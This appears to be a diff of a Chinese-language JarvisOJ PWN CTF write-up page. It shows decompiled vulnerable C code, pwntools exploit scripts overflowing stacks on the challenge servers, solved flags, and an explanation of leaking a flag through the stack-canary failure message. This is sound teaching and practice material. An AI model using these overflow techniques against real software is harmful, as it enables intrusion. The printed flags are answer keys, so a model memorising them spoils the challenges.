+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">mem_test</span><span class="params">(<span class="keyword">char</span> *s2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+15h] [bp-13h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">11u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nwhat???? : "</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"0x%x \n"</span>, hint);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"cff flag go go go ...\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;s);<span class="comment">//溢出点</span></span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;s, s2, <span class="number">4u</span>) )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"good job!!\n"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"cff flag is failed!!\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>问题出在<code>mem_test()</code>函数的<code>scanf</code>上，查看栈结构很容易知道溢出填充长度为<code>23</code>。<br>
 此外还有一个<code>win_func()</code>函数和一个<code>catFlag</code>只读数据</p>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/00-56-31.jpg" alt="00-56-31.jpg" title="">
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">win_func</span><span class="params">(<span class="keyword">char</span> *command)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">return</span> system(command);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/00-56-31.jpg" alt=""></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">win_func</span><span class="params">(<span class="keyword">char</span> *command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>所以思路就很简单了。<br>
 溢出跳过<code>win_func()</code>，然后栈上传个<code>catFlag</code>就好了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </div><div class="line"><span class="comment">#pro = process("./memory") </span></div><div class="line">pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9876</span>)</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span></div><div class="line">	pro.recvuntil(recv_buf)</div><div class="line">	<span class="keyword">if</span> new_line:</div><div class="line">		pro.sendline(send_buf)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		pro.send(send_buf)</div><div class="line">payload = <span class="string">"A"</span>*<span class="number">23</span></div><div class="line">payload +=p32(<span class="number">0x80485BD</span>)</div><div class="line">payload +=p32(<span class="number">0x80487E0</span>)+p32(<span class="number">0x80487E0</span>)</div><div class="line">respone(<span class="string">"&gt; "</span>,payload)</div><div class="line">pro.interactive()</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#pro = process("./memory") </span></span><br><span class="line">pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9876</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span></span><br><span class="line">	pro.recvuntil(recv_buf)</span><br><span class="line">	<span class="keyword">if</span> new_line:</span><br><span class="line">		pro.sendline(send_buf)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		pro.send(send_buf)</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">23</span></span><br><span class="line">payload +=p32(<span class="number">0x80485BD</span>)</span><br><span class="line">payload +=p32(<span class="number">0x80487E0</span>)+p32(<span class="number">0x80487E0</span>)</span><br><span class="line">respone(<span class="string">"&gt; "</span>,payload)</span><br><span class="line">pro.interactive()</span><br></pre></td></tr></table></figure>
 <p><strong>Flag: CTF{332e294fb7aeeaf0e1c7703a29304343}</strong></p>
 <h1 id="tell-me-something"><a class="markdownIt-Anchor" href="#tell-me-something"></a> Tell me something</h1>
 <p>很简单的一题，一个溢出点一个<code>cat Flag</code>函数，不赘述</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </div><div class="line"><span class="comment">#pro = process("./guestbook")</span></div><div class="line">pro = remote(<span class="string">"pwn.jarvisoj.com"</span>, <span class="number">9876</span>)</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span></div><div class="line">	pro.recvuntil(recv_buf)</div><div class="line">	<span class="keyword">if</span> new_line:</div><div class="line">		pro.sendline(send_buf)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		pro.send(send_buf)</div><div class="line">payload = <span class="string">"A"</span>*<span class="number">136</span></div><div class="line">payload += p64(<span class="number">0x400620</span>)</div><div class="line">respone(<span class="string">"Input your message:\n"</span>,payload)</div><div class="line"><span class="keyword">print</span> pro.recv(<span class="number">500</span>)</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#pro = process("./guestbook")</span></span><br><span class="line">pro = remote(<span class="string">"pwn.jarvisoj.com"</span>, <span class="number">9876</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span></span><br><span class="line">	pro.recvuntil(recv_buf)</span><br><span class="line">	<span class="keyword">if</span> new_line:</span><br><span class="line">		pro.sendline(send_buf)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		pro.send(send_buf)</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">136</span></span><br><span class="line">payload += p64(<span class="number">0x400620</span>)</span><br><span class="line">respone(<span class="string">"Input your message:\n"</span>,payload)</span><br><span class="line"><span class="keyword">print</span> pro.recv(<span class="number">500</span>)</span><br></pre></td></tr></table></figure>
 <p><strong>Flag: PCTF{This_is_J4st_Begin}</strong></p>
 <h1 id="smashes"><a class="markdownIt-Anchor" href="#smashes"></a> Smashes</h1>
 <p>首先分析一下程序：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  __int64 v3; <span class="comment">// rax@1</span></div><div class="line">  __int64 v4; <span class="comment">// rbx@2</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax@3</span></div><div class="line">  __int64 v8; <span class="comment">// [sp+0h] [bp-128h]@1</span></div><div class="line">  __int64 v9; <span class="comment">// [sp+108h] [bp-20h]@1</span></div><div class="line"></div><div class="line">  v9 = *MK_FP(__FS__, <span class="number">40L</span>L);</div><div class="line">  __printf_chk(<span class="number">1L</span>L, <span class="number">0x400934</span>LL);                <span class="comment">// print "Hello!\nWhat's your name?"</span></div><div class="line">  LODWORD(v3) = _IO_gets(&amp;v8);                  <span class="comment">// Read</span></div><div class="line">  <span class="keyword">if</span> ( !v3 )</div><div class="line">LABEL_9:</div><div class="line">    _exit(<span class="number">1</span>);</div><div class="line">  v4 = <span class="number">0L</span>L;</div><div class="line">  __printf_chk(<span class="number">1L</span>L, <span class="number">0x400960</span>LL);                <span class="comment">// print Your name what you just input</span></div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )                                   <span class="comment">// 读取输入，覆盖flag</span></div><div class="line">  &#123;</div><div class="line">    v5 = _IO_getc(<span class="built_in">stdin</span>);</div><div class="line">    <span class="keyword">if</span> ( v5 == <span class="number">-1</span> )</div><div class="line">      <span class="keyword">goto</span> LABEL_9;</div><div class="line">    <span class="keyword">if</span> ( v5 == <span class="string">'\n'</span> )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    byte_600D20[v4++] = v5;</div><div class="line">    <span class="keyword">if</span> ( v4 == <span class="number">32</span> )</div><div class="line">      <span class="keyword">goto</span> LABEL_8;</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span> *)((<span class="keyword">signed</span> <span class="keyword">int</span>)v4 + <span class="number">0x600D20</span>LL), <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">32</span> - v4));<span class="comment">// 将flag清零</span></div><div class="line">LABEL_8:</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Thank you, bye!"</span>);</div><div class="line">  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40L</span>L) ^ v9;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax@1</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx@2</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax@3</span></span><br><span class="line">  __int64 v8; <span class="comment">// [sp+0h] [bp-128h]@1</span></span><br><span class="line">  __int64 v9; <span class="comment">// [sp+108h] [bp-20h]@1</span></span><br><span class="line"></span><br><span class="line">  v9 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="number">0x400934</span>LL);                <span class="comment">// print "Hello!\nWhat's your name?"</span></span><br><span class="line">  LODWORD(v3) = _IO_gets(&amp;v8);                  <span class="comment">// Read</span></span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">LABEL_9:</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  v4 = <span class="number">0L</span>L;</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="number">0x400960</span>LL);                <span class="comment">// print Your name what you just input</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )                                   <span class="comment">// 读取输入，覆盖flag</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = _IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="string">'\n'</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    byte_600D20[v4++] = v5;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">32</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span> *)((<span class="keyword">signed</span> <span class="keyword">int</span>)v4 + <span class="number">0x600D20</span>LL), <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">32</span> - v4));<span class="comment">// 将flag清零</span></span><br><span class="line">LABEL_8:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Thank you, bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40L</span>L) ^ v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>在程序<code>data</code>段的末尾<code>0x600D20</code>处有一句提示<code>PCTF{Here',27h,'s the flag on server}</code>,提示我们flag就在此处，需要我们想办法获得，而程序后面会将flag置零</p>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/19-37-38.jpg" alt="19-37-38.jpg" title="">
+<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/19-37-38.jpg" alt=""></p>
 <p>这题看似简单，但是需要知道两个知识点才能解决</p>
 <ol>
 <li>Canary保护机制</li>
@@ -681,19 +428,19 @@ PS :当然，寻找控制6个参数的gadget的方法是存在的，可利用的
 <p>对于linux下的程序保护机制，我的上篇文章也有提及Canary保护。<br>
 <code>Canary</code>，金丝雀。据说是以前矿工用金丝雀来确定地下气体是否有毒或者是否适合工作。。。但是这个名字的由来很好地跟我们解释了这个<code>Canary</code>的作用<br>
 <code>Canary</code>位置如图：</p>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/19-07-05.jpg" alt="19-07-05.jpg" title="">
-<p><code>Canary</code>是随机生成的一段数据。当我们想栈溢出的时候，填充的数据就会破坏<code>Canary</code>，当程序<code>Return</code>的时候就会检查<code>Canary</code>是否被破坏。如果被破坏了就会调用<code>___stack_chk_fail</code>中断程序，从而达到保护程序控制流不被修改的目的。而函数的原型如下:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</div><div class="line">&#123;</div><div class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</div><div class="line">&#123;</div><div class="line"> <span class="comment">//神奇的注释</span></div><div class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></div><div class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</div><div class="line">    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</div><div class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/19-07-05.jpg" alt=""><br>
+<code>Canary</code>是随机生成的一段数据。当我们想栈溢出的时候，填充的数据就会破坏<code>Canary</code>，当程序<code>Return</code>的时候就会检查<code>Canary</code>是否被破坏。如果被破坏了就会调用<code>___stack_chk_fail</code>中断程序，从而达到保护程序控制流不被修改的目的。而函数的原型如下:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="comment">//神奇的注释</span></span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>大致意思就是会输入一段文字提示你程序炸了,然后这段文字里面包含一个我们感兴趣的参数<code>__libc_argv[0]</code>，这个是啥意思呢<br>
 咱们写C程序的<code>main</code>函数的时候完整写法应该是这样的:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span>  <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br></pre></td></tr></table></figure>
 <p>第一个<code>argc</code>参数是指你传入到<code>main</code>参数的个数，第二个参数<code>argv</code>,是一个指针的指针，类似于二维数组，其实可以理解为就是一个字符串数组<code>argv[0]</code>是程序路径，<code>argv[1]</code>起对应的是咱们传进<code>main</code>函数的一个个参数<br>
 <strong><code>argv[0]</code>是存储在栈上的</strong>，所以我们可以将<code>argv[0]</code>的地址换成我们想要的地址，如<code>flag</code>地址，然后程序就会输出我们想要的内容了<br>
 但是话又说回来，虽然我们可以输出任意地址的字符串，但是我们的<code>flag</code>是被覆盖了啊。俗话说<code>巧妇难为无米之炊</code>。但是我们可以通过<code>linux</code>下elf文件加载进内存的一些特性来实现我们的构想</p>
 <h2 id="elf文件段加载或者说内存映射关系"><a class="markdownIt-Anchor" href="#elf文件段加载或者说内存映射关系"></a> ELF文件段加载或者说内存映射关系</h2>
-<p>参考<a href="https://ctf-wiki.github.io/ctf-wiki/executable/elf/program_loading.html" target="_blank" rel="external">CTF-Wiki - 程序加载</a><br>
-文中有如下一段话：</p>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-30-40.jpg" alt="01-30-40.jpg" title=""><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-33-07.jpg" alt="01-33-07.jpg" title="">
+<p>参考<a href="https://ctf-wiki.github.io/ctf-wiki/executable/elf/program_loading.html" target="_blank" rel="noopener">CTF-Wiki - 程序加载</a><br>
+文中有如下一段话：<br>
+<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-30-40.jpg" alt=""><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-33-07.jpg" alt=""></p>
 <blockquote>
 <p>在这个例子中，尽管代码段和数据段在模4KB的意义下相等，但是仍然最多有4个页面包含有不纯的代码或者数据。当然，<strong>实际中会取决于页大小或者文件系统的块大小。</strong></p>
 </blockquote>
@@ -707,510 +454,128 @@ PS :当然，寻找控制6个参数的gadget的方法是存在的，可利用的
 <p>逻辑上说，系统会对强制控制内存的权限，就好比每一个段的权限都是完全独立的；段的地址会被调整，以便于确保内存中的每一个逻辑页都只有一组类型的权限。在上面给出的例子中，<strong>文件的代码段的最后一部分和数据段的开始部分都会被映射两次：分别在数据段的虚拟地址以及代码段的虚拟地址。</strong><br>
 然后文件在内存中就会映射成这样子：</p>
 </blockquote>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-40-31.jpg" alt="01-40-31.jpg" title="">
-<p>很清楚地看到，以4KB大小分割（linux64bit的默认页大小是0x1000Bytes）文件状态下的数据(代码也是数据),段与段之间会有重叠部分，而系统索性全部映射过来，所以<strong>代码段的最后一页包含了数据段开始部分的副本，而数据段的第一页包含了代码段的最后部分的副本。（如图）</strong><br>
-由于我们的文件很小，且通过<code>readelf</code>查看段的文件偏移全部小于0x1000</p>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-48-06.jpg" alt="01-48-06.jpg" title="">
-<p>且前面几段映射的基址是<code>0x400000</code>,到后面的<code>.init_array</code>段的映射基址是<code>0x600000</code>故我们有理由断定，在内存里面会存在两份<code>.data</code>段和<code>.bss</code>段（其实其他段也会被映射两次）</p>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-48-43.jpg" alt="01-48-43.jpg" title="">
-<p>接下来我们实际演示一下用gdb下断点调试，然后找<code>.rodata</code>段里面的数据在内存里面的位置来验证我们的猜想</p>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-53-18.jpg" alt="01-53-18.jpg" title="">
-<p>首先随便下个断点，让程序装载就好了<br>
-然后我们寻找<code>.rodata</code>段里面的数据<code>&quot;Thank you, bye!&quot;</code></p>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-57-08.jpg" alt="01-57-08.jpg" title="">
-<p>果不其然，位于地址<code>0x40094E</code>的数据 <code>&quot;Thank you, bye!&quot;</code>在内存里面被映射了两次。<br>
+<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-40-31.jpg" alt=""><br>
+很清楚地看到，以4KB大小分割（linux64bit的默认页大小是0x1000Bytes）文件状态下的数据(代码也是数据),段与段之间会有重叠部分，而系统索性全部映射过来，所以<strong>代码段的最后一页包含了数据段开始部分的副本，而数据段的第一页包含了代码段的最后部分的副本。（如图）</strong><br>
+由于我们的文件很小，且通过<code>readelf</code>查看段的文件偏移全部小于0x1000<br>
+<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-48-06.jpg" alt=""><br>
+且前面几段映射的基址是<code>0x400000</code>,到后面的<code>.init_array</code>段的映射基址是<code>0x600000</code>故我们有理由断定，在内存里面会存在两份<code>.data</code>段和<code>.bss</code>段（其实其他段也会被映射两次）<br>
+<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-48-43.jpg" alt=""><br>
+接下来我们实际演示一下用gdb下断点调试，然后找<code>.rodata</code>段里面的数据在内存里面的位置来验证我们的猜想<br>
+<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-53-18.jpg" alt=""><br>
+首先随便下个断点，让程序装载就好了<br>
+然后我们寻找<code>.rodata</code>段里面的数据<code>&quot;Thank you, bye!&quot;</code><br>
+<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-57-08.jpg" alt=""><br>
+果不其然，位于地址<code>0x40094E</code>的数据 <code>&quot;Thank you, bye!&quot;</code>在内存里面被映射了两次。<br>
 既然我们猜想实现，那么我们来尝试寻找在<code>.data</code>段里面的<code>PCTF{</code><br>
-这次我们把断点定在<code>0x40080B</code>处，为的是不让下面的函数将<code>PCTF{</code>破坏掉</p>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-01-54.jpg" alt="02-01-54.jpg" title="">
-<p>同样的，我们在内存中(或者说是程序虚拟空间中)找到了两处<code>PCTF{</code>的映射<br>
+这次我们把断点定在<code>0x40080B</code>处，为的是不让下面的函数将<code>PCTF{</code>破坏掉<br>
+<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-01-54.jpg" alt=""><br>
+同样的，我们在内存中(或者说是程序虚拟空间中)找到了两处<code>PCTF{</code>的映射<br>
 所以就算地址<code>0x600D20</code>处的flag被破坏，我们也能在另外一处即地址<code>0x400D20</code>找到一模一样的flag备份<br>
 那么结合我们上面说的用溢出点覆盖栈上的字符串地址<code>argv[0]</code>,然后利Canary被破坏的机制触发<code>___stack_chk_fail</code>函数将flag输出出来<br>
 我们首先得找一下溢出点到<code>argv[0]</code>的偏移<br>
-我们的溢出点，很容易发现在黄色高亮的代码处</p>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-07-36.jpg" alt="02-07-36.jpg" title="">
-<p>然后我们设置两个断点，一个是在<code>0x4007E0</code>即<code>main</code>函数刚开始的传参完毕的地方，第二个是我们溢出点后<code>0x400813</code>处<br>
-首先我们用gdb运行程序来到了第一个断点<code>0x4007E0</code></p>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-19-41.jpg" alt="02-19-41.jpg" title="">
-<p>可以看到<code>char ** argv</code>的值在栈地址<code>0x7fffffffdfa8</code>处，而真正的字符串数组地址是<code>0x7fffffffe078</code><br>
-然后我们在&quot;name?“后面随便输入了个字符串&quot;test”,然后来到第二个断点</p>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-28-03.jpg" alt="02-28-03.jpg" title="">
-<p>得到我们溢出buff的地址在<code>0x7fffffffde60</code><br>
+我们的溢出点，很容易发现在黄色高亮的代码处<br>
+<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-07-36.jpg" alt=""><br>
+然后我们设置两个断点，一个是在<code>0x4007E0</code>即<code>main</code>函数刚开始的传参完毕的地方，第二个是我们溢出点后<code>0x400813</code>处<br>
+首先我们用gdb运行程序来到了第一个断点<code>0x4007E0</code><br>
+<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-19-41.jpg" alt=""><br>
+可以看到<code>char ** argv</code>的值在栈地址<code>0x7fffffffdfa8</code>处，而真正的字符串数组地址是<code>0x7fffffffe078</code><br>
+然后我们在&quot;name?“后面随便输入了个字符串&quot;test”,然后来到第二个断点<br>
+<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-28-03.jpg" alt=""><br>
+得到我们溢出buff的地址在<code>0x7fffffffde60</code><br>
 所以我们将地址一相减就会得到数据填充偏移<code>0x7fffffffde60-0x7fffffffe078=536</code><br>
 所以我们这样构造poc:</p>
